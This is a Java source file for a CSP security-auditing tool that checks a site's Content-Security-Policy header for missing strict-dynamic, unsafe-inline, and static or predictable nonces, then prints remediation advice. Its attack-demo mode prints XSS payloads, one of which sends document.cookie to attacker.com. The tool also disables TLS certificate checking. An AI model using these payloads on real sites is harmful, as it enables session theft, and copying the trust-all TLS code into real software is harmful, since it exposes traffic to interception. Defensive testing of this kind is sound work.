package com.csp.tester;

import com.csp.tester.models.CSPVulnerabilityReport;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.regex.Pattern;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.cert.X509Certificate;

public class EthicalCSPAttacker {
    
    private static final String GREEN = "\u001B[32m";
    private static final String RED = "\u001B[31m";
    private static final String YELLOW = "\u001B[33m";
    private static final String CYAN = "\u001B[36m";
    private static final String RESET = "\u001B[0m";
    
    private static final Pattern SCRIPT_SRC_PATTERN = Pattern.compile("script-src[^;]*");
    private static final Pattern NONCE_PATTERN = Pattern.compile("'nonce-([^']+)'");
    private static final Pattern STRICT_DYNAMIC_PATTERN = Pattern.compile("'strict-dynamic'");
    
    public static void main(String[] args) {
        printBanner();
        
        if (args.length < 1) {
            printUsage();
            System.exit(1);
        }
        
        String targetUrl = args[0];
        boolean simulateAttack = args.length > 1 && args[1].equals("--simulate-attack");
        
        try {
            EthicalCSPAttacker tester = new EthicalCSPAttacker();
            CSPVulnerabilityReport report = tester.analyzeCSP(targetUrl);
            tester.printReport(report);
            
            if (simulateAttack && report.isVulnerable()) {
                tester.demonstrateAttack(targetUrl, report);
            }
            
        } catch (Exception e) {
            System.err.println(RED + "Error: " + e.getMessage() + RESET);
            e.printStackTrace();
        }
    }
    
    private static void printBanner() {
        System.out.println(CYAN + "╔══════════════════════════════════════════════════════════╗" + RESET);
        System.out.println(CYAN + "║     Ethical CSP Security Testing Tool v1.0              ║" + RESET);
        System.out.println(CYAN + "║     For Authorized Security Testing Only                ║" + RESET);
        System.out.println(CYAN + "╚══════════════════════════════════════════════════════════╝" + RESET);
        System.out.println();
    }
    
    private static void printUsage() {
        System.out.println(YELLOW + "Usage: java -jar ethicalattacker.jar <target-url> [--simulate-attack]" + RESET);
        System.out.println("Example: java -jar ethicalattacker.jar http://localhost:8080/myapp");
        System.out.println("         java -jar ethicalattacker.jar http://localhost:8080/myapp --simulate-attack");
    }
    
    public CSPVulnerabilityReport analyzeCSP(String urlString) throws Exception {
        CSPVulnerabilityReport report = new CSPVulnerabilityReport();
        report.setTargetUrl(urlString);
        
        System.out.println(CYAN + "[*] Target: " + urlString + RESET);
        System.out.println(CYAN + "[*] Starting CSP Analysis..." + RESET);
        System.out.println();
        
        List<String> cspHeaders = new ArrayList<String>();
        List<String> nonces = new ArrayList<String>();
        
        for (int i = 0; i < 5; i++) {
            Map<String, List<String>> headers = fetchHeaders(urlString);
            String cspHeader = extractCSP(headers);
            
            if (cspHeader != null && i == 0) {
                cspHeaders.add(cspHeader);
                analyzeCSPContent(cspHeader, report);
            }
            
            if (cspHeader != null) {
                java.util.regex.Matcher matcher = NONCE_PATTERN.matcher(cspHeader);
                if (matcher.find()) {
                    nonces.add(matcher.group(1));
                }
            }
            
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
        
        if (!cspHeaders.isEmpty()) {
            report.setHasCSP(true);
            report.setCspHeader(cspHeaders.get(0));
            
            if (!nonces.isEmpty()) {
                report.setHasNonce(true);
                report.setNoncesCollected(nonces);
                analyzeNonceBehavior(report);
            }
        }
        
        determineVulnerabilities(report);
        return report;
    }
    
    private Map<String, List<String>> fetchHeaders(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        
        if (connection instanceof HttpsURLConnection) {
            HttpsURLConnection httpsConn = (HttpsURLConnection) connection;
            httpsConn.setHostnameVerifier((hostname, session) -> true);
            httpsConn.setSSLSocketFactory(createTrustAllSocketFactory());
        }
        
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", "CSP-Security-Tester/1.0");
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(10000);
        connection.setInstanceFollowRedirects(false);
        
        Map<String, List<String>> headers = connection.getHeaderFields();
        connection.disconnect();
        
        return headers;
    }
    
    private javax.net.ssl.SSLSocketFactory createTrustAllSocketFactory() {
        try {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, new TrustManager[]{new TrustAllManager()}, new java.security.SecureRandom());
            return sc.getSocketFactory();
        } catch (Exception e) {
            return (javax.net.ssl.SSLSocketFactory) javax.net.ssl.SSLSocketFactory.getDefault();
        }
    }
    
    private static class TrustAllManager implements X509TrustManager {
        public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
    }
    
    private String extractCSP(Map<String, List<String>> headers) {
        for (Map.Entry<String, List<String>> entry : headers.entrySet()) {
            String key = entry.getKey();
            if (key != null && key.equalsIgnoreCase("Content-Security-Policy")) {
                List<String> values = entry.getValue();
                if (values != null && !values.isEmpty()) {
                    return values.get(0);
                }
            }
        }
        return null;
    }
    
    private void analyzeCSPContent(String csp, CSPVulnerabilityReport report) {
        System.out.println(GREEN + "[✓] CSP Header Found:" + RESET);
        System.out.println("    " + csp);
        System.out.println();
        
        java.util.regex.Matcher scriptMatcher = SCRIPT_SRC_PATTERN.matcher(csp);
        if (scriptMatcher.find()) {
            String scriptSrc = scriptMatcher.group();
            
            if (NONCE_PATTERN.matcher(scriptSrc).find()) {
                report.setHasNonce(true);
                System.out.println(GREEN + "[✓] Nonce-based CSP detected" + RESET);
            }
            
            if (STRICT_DYNAMIC_PATTERN.matcher(scriptSrc).find()) {
                report.setHasStrictDynamic(true);
                System.out.println(GREEN + "[✓] strict-dynamic detected" + RESET);
            } else {
                System.out.println(RED + "[✗] strict-dynamic NOT enabled" + RESET);
                report.addVulnerability("Missing strict-dynamic directive");
            }
            
            if (Pattern.compile("'unsafe-inline'").matcher(scriptSrc).find()) {
                report.setHasUnsafeInline(true);
                System.out.println(RED + "[✗] unsafe-inline present - weakens CSP" + RESET);
                report.addVulnerability("unsafe-inline weakens CSP protection");
            }
        }
    }
    
    private void analyzeNonceBehavior(CSPVulnerabilityReport report) {
        System.out.println("\n" + CYAN + "[*] Analyzing Nonce Behavior..." + RESET);
        
        List<String> nonces = report.getNoncesCollected();
        if (nonces.isEmpty()) {
            System.out.println(RED + "[✗] No nonces found" + RESET);
            return;
        }
        
        Set<String> uniqueNonces = new HashSet<String>(nonces);
        
        if (uniqueNonces.size() > 1) {
            report.setNonceDynamic(true);
            System.out.println(GREEN + "[✓] Nonce is DYNAMIC (changes per request)" + RESET);
            System.out.println("    Unique nonces found: " + uniqueNonces.size());
        } else {
            report.setNonceDynamic(false);
            System.out.println(RED + "[✗] CRITICAL: Nonce is STATIC (reused across requests)" + RESET);
            report.addVulnerability("Static nonce - can be reused for XSS attacks");
        }
        
        checkNoncePredictability(report);
    }
    
    private void checkNoncePredictability(CSPVulnerabilityReport report) {
        System.out.println("\n" + CYAN + "[*] Testing Nonce Predictability..." + RESET);
        
        List<String> nonces = report.getNoncesCollected();
        if (nonces.size() < 2) {
            System.out.println(YELLOW + "[!] Insufficient nonces for predictability test" + RESET);
            return;
        }
        
        boolean predictable = false;
        String pattern = "";
        
        for (int i = 1; i < nonces.size(); i++) {
            String prev = nonces.get(i-1);
            String curr = nonces.get(i);
            
            if (curr.matches("\\d+") && prev.matches("\\d+")) {
                long diff = Long.parseLong(curr) - Long.parseLong(prev);
                if (diff > 0 && diff < 100000) {
                    predictable = true;
                    pattern = "numeric timestamp (difference: " + diff + ")";
                    break;
                }
            }
            
            if (curr.matches("[a-fA-F0-9]{32,40}") && prev.matches("[a-fA-F0-9]{32,40}")) {
                predictable = true;
                pattern = "hash-like pattern (possible weak hash)";
                break;
            }
        }
        
        report.setNoncePredictable(predictable);
        if (predictable) {
            System.out.println(RED + "[✗] WARNING: Nonce appears PREDICTABLE!" + RESET);
            System.out.println(RED + "    Pattern detected: " + pattern + RESET);
            report.addVulnerability("Predictable nonce - attackers can guess future nonces");
        } else {
            System.out.println(GREEN + "[✓] Nonce appears cryptographically random" + RESET);
        }
        
        System.out.println("\n" + CYAN + "Sample nonces collected:" + RESET);
        for (int i = 0; i < Math.min(3, nonces.size()); i++) {
            System.out.println("    Request " + (i+1) + ": " + truncateNonce(nonces.get(i)));
        }
    }
    
    private void determineVulnerabilities(CSPVulnerabilityReport report) {
        System.out.println("\n" + CYAN + "════════════════════════════════════════════════════" + RESET);
        System.out.println(CYAN + "VULNERABILITY ASSESSMENT" + RESET);
        System.out.println(CYAN + "════════════════════════════════════════════════════" + RESET);
        
        if (!report.isHasCSP()) {
            System.out.println(RED + "[CRITICAL] No CSP header - application is vulnerable to XSS" + RESET);
            report.setVulnerableToBypass(true);
            report.setAttackVector("Basic XSS injection without CSP restrictions");
            return;
        }
        
        if (report.isHasNonce() && !report.isHasStrictDynamic()) {
            System.out.println(RED + "[HIGH] Missing strict-dynamic with nonce-based CSP" + RESET);
            System.out.println(RED + "  → Attackers can bypass nonce by injecting whitelisted script sources" + RESET);
            report.setVulnerableToBypass(true);
            report.setAttackVector("Inject script from whitelisted origin (bypass nonce via allowed CDN)");
            report.addVulnerability("Missing strict-dynamic allows whitelisted source bypass");
        }
        
        if (report.isHasNonce() && !report.isNonceDynamic()) {
            System.out.println(RED + "[CRITICAL] Static nonce - complete CSP bypass possible" + RESET);
            System.out.println(RED + "  → Attackers can extract and reuse the same nonce" + RESET);
            report.setVulnerableToBypass(true);
            report.setAttackVector("Extract nonce from response and reuse in XSS payload");
        }
        
        if (report.isNoncePredictable()) {
            System.out.println(RED + "[HIGH] Predictable nonce - attackers can forge nonces" + RESET);
            report.setVulnerableToBypass(true);
        }
        
        if (!report.isVulnerableToBypass() && report.isHasCSP()) {
            System.out.println(GREEN + "[SAFE] CSP appears properly configured with dynamic nonces" + RESET);
        }
    }
    
    public void demonstrateAttack(String urlString, CSPVulnerabilityReport report) {
        System.out.println("\n" + YELLOW + "╔════════════════════════════════════════════════════╗" + RESET);
        System.out.println(YELLOW + "║         ATTACK SIMULATION (Educational Only)         ║" + RESET);
        System.out.println(YELLOW + "╚════════════════════════════════════════════════════╝" + RESET);
        
        if (report.isHasNonce() && !report.isHasStrictDynamic()) {
            demonstrateStrictDynamicBypass();
        }
        
        if (!report.isNonceDynamic() && report.isHasNonce()) {
            demonstrateStaticNonceAttack(report);
        }
        
        if (report.isNoncePredictable()) {
            demonstratePredictableNonceAttack(report);
        }
    }
    
    private void demonstrateStrictDynamicBypass() {
        System.out.println("\n" + RED + "[DEMO] Bypassing CSP without strict-dynamic:" + RESET);
        System.out.println(YELLOW + "Attack Vector:" + RESET);
        System.out.println("  Since strict-dynamic is missing, the CSP whitelists specific origins.");
        System.out.println("  An attacker can inject:");
        System.out.println();
        System.out.println(CYAN + "  <script src=\"https://cdn.example.com/evil.js\"></script>" + RESET);
        System.out.println(CYAN + "  <script>alert('XSS - Bypassed nonce!');</script>" + RESET);
        System.out.println();
        System.out.println(YELLOW + "  Remediation: Add 'strict-dynamic' and remove whitelisted origins" + RESET);
    }
    
    private void demonstrateStaticNonceAttack(CSPVulnerabilityReport report) {
        System.out.println("\n" + RED + "[DEMO] Static Nonce Attack:" + RESET);
        if (!report.getNoncesCollected().isEmpty()) {
            String staticNonce = report.getNoncesCollected().get(0);
            System.out.println(YELLOW + "Extracted static nonce: " + staticNonce + RESET);
            System.out.println(YELLOW + "Attack Vector:" + RESET);
            System.out.println("  <script nonce=\"" + staticNonce + "\">");
            System.out.println("    fetch('https://attacker.com/steal?cookie='+document.cookie);");
            System.out.println("  </script>");
            System.out.println();
            System.out.println(YELLOW + "  Remediation: Generate cryptographically random nonce per request" + RESET);
        }
    }
    
    private void demonstratePredictableNonceAttack(CSPVulnerabilityReport report) {
        System.out.println("\n" + RED + "[DEMO] Predictable Nonce Attack:" + RESET);
        System.out.println(YELLOW + "Attack Vector:" + RESET);
        System.out.println("  1. Collect current nonce from response");
        System.out.println("  2. Generate next nonce sequence based on pattern");
        System.out.println("  3. Inject script with predicted nonce");
        System.out.println();
        System.out.println(YELLOW + "  Remediation: Use CSPRNG with at least 128 bits of entropy" + RESET);
    }
    
    public void printReport(CSPVulnerabilityReport report) {
        System.out.println("\n" + CYAN + "════════════════════════════════════════════════════" + RESET);
        System.out.println(CYAN + "FINAL SECURITY REPORT" + RESET);
        System.out.println(CYAN + "════════════════════════════════════════════════════" + RESET);
        
        System.out.println("\n" + CYAN + "Summary:" + RESET);
        System.out.println("  Target: " + report.getTargetUrl());
        System.out.println("  CSP Present: " + (report.isHasCSP() ? GREEN + "Yes" : RED + "No") + RESET);
        
        if (report.isHasCSP()) {
            System.out.println("  Nonce-based: " + (report.isHasNonce() ? GREEN + "Yes" : YELLOW + "No") + RESET);
            System.out.println("  strict-dynamic: " + (report.isHasStrictDynamic() ? GREEN + "Yes" : RED + "No") + RESET);
            System.out.println("  Dynamic Nonce: " + (report.isNonceDynamic() ? GREEN + "Yes" : RED + "No") + RESET);
            System.out.println("  Predictable: " + (report.isNoncePredictable() ? RED + "Yes" : GREEN + "No") + RESET);
        }
        
        if (!report.getVulnerabilities().isEmpty()) {
            System.out.println("\n" + RED + "Vulnerabilities Found:" + RESET);
            for (String vuln : report.getVulnerabilities()) {
                System.out.println("  • " + vuln);
            }
        }
        
        if (report.isVulnerableToBypass()) {
            System.out.println("\n" + RED + "╔════════════════════════════════════════════════════╗" + RESET);
            System.out.println(RED + "║  VULNERABLE: CSP can be bypassed!                   ║" + RESET);
            System.out.println(RED + "╚════════════════════════════════════════════════════╝" + RESET);
            System.out.println("\n" + YELLOW + "Attack Vector: " + report.getAttackVector() + RESET);
        } else {
            System.out.println("\n" + GREEN + "╔════════════════════════════════════════════════════╗" + RESET);
            System.out.println(GREEN + "║  SECURE: CSP configuration appears robust            ║" + RESET);
            System.out.println(GREEN + "╚════════════════════════════════════════════════════╝" + RESET);
        }
        
        printRecommendations(report);
    }
    
    private void printRecommendations(CSPVulnerabilityReport report) {
        System.out.println("\n" + CYAN + "Recommendations:" + RESET);
        if (!report.isHasStrictDynamic() && report.isHasNonce()) {
            System.out.println("  1. Add 'strict-dynamic' to script-src directive");
            System.out.println("  2. Remove whitelisted origins when using nonce+strict-dynamic");
        }
        if (!report.isNonceDynamic() && report.isHasNonce()) {
            System.out.println("  3. Implement per-request nonce generation using CSPRNG");
            System.out.println("  4. Use at least 128-bit (16 byte) random nonces");
        }
        if (report.isNoncePredictable()) {
            System.out.println("  5. Use java.security.SecureRandom for nonce generation");
            System.out.println("  6. Never use timestamps, counters, or weak hashes as nonces");
        }
    }
    
    private String truncateNonce(String nonce) {
        if (nonce == null) return "null";
        if (nonce.length() <= 25) return nonce;
        return nonce.substring(0, 22) + "...";
    }
}